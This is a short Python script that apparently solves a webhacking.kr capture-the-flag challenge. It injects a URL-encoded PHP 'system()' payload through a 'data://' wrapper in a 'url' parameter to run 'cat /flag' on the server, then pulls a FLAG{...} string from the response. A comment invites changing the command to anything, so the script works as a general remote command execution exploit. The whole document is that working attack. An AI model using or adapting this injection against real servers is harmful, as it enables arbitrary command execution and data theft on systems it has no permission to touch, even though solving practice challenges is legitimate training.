import urllib.parse
import requests
import re

# Change the command to do what you want
# For example, to read the flag file, you can use:
cmd = "cat /flag"
payload = urllib.parse.quote(f"<?php echo system('{cmd}') ?>")

URL = "http://webhacking.kr:10009/"
params = {
    'url': f'data://webhacking.kr:10009/,http://webhacking.kr:10009/{payload}'
}

req = requests.get(URL, params=params)

# if you want to see the response text, uncomment the next line
# print(req.text)

# Extract the flag from the response
# Assuming the flag is in the format FLAG{...}
res = re.search(r'FLAG{(.*)}', req.text)
print(res.group(0) if res else "No flag found")

